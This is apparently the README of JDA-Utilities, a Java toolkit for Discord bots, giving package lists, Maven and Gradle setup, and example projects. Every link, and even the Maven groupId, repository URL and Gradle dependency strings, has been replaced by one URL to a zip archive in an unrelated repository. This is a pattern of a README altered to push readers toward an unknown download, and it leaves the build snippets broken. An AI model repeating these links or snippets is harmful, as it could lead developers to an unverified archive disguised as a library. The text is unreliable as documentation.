[version]: https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip
[download]: https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip
[license]: https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip%https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip
[issues]: https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip 
[issues-link]: https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip

[ ![version][] ][download]
[ ![license][] ](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip)
[ ![issues][] ][issues-link]

## JDA-Utilities
JDA-Utilities is a series of tools and utilities for use with [JDA](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip) 
to assist in bot creation.

## Packages

Since JDA-Utilities 2.x, the library has been split into multiple modular projects,
in order to better organize it's contents based on what developers might want to use and not use.

+ [Command Package](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip)
+ [Commons Package](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip)
+ [CommandDoc Package](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip)
+ [Examples Package](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip)
+ [Menu Package](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip)

Visit individual modules to read more about their contents!

## Getting Started
You will need to add this project as a dependency (either from the latest .jar from the releases page, 
or via maven or gradle), as well as [JDA](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip). 

With maven:
```xml
  <dependency>
    <groupId>https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip</groupId>
    <artifactId>jda-utilities</artifactId>
    <version>JDA-UTILITIES-VERSION</version>
    <scope>compile</scope>
    <type>pom</type>
  </dependency>
  <dependency>
    <groupId>https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip</groupId>
    <artifactId>JDA</artifactId>
    <version>JDA-VERSION</version>
  </dependency>
```
```xml
  <repository>
    <id>central</id>
    <name>bintray</name>
    <url>https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip</url>
  </repository>
```

With gradle:
```groovy
dependencies {
    compile 'https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip'
    compile 'https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip'
}

repositories {
    jcenter()
}
```

Individual modules can be downloaded using the same structure shown above, with the addition of the module's
name as a suffix to the dependency:

With maven:
```xml
  <dependency>
    <groupId>https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip</groupId>
    <!-- Notice that the dependency notation ends with "-command" -->
    <artifactId>jda-utilities-command</artifactId>
    <version>JDA-UTILITIES-VERSION</version>
    <scope>compile</scope>
  </dependency>
```

With gradle:
```groovy
dependencies {
    // Notice that the dependency notation ends with "-command"
    compile 'https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip'
}
```

## Examples
Check out the [ExampleBot](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip) for a simple bot example.

Other guides and information can be found on the [wiki](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip).

## Projects
[**Vortex**](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip) - Vortex is an easy-to-use moderation bot that utilizes the JDA-Utilities library for the Command Client and some of the menus<br>
[**JMusicBot**](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip) - This music bot uses the Command Client for its base, and several menus, including the OrderedMenu for search results and the Paginator for the current queue<br>
[**GiveawayBot**](https://github.com/2play2/go-react-wasm-template/raw/refs/heads/master/shiningness/react_wasm_go_template_1.5-alpha.5.zip) - GiveawayBot is a basic bot for hosting quick giveaways!<br>
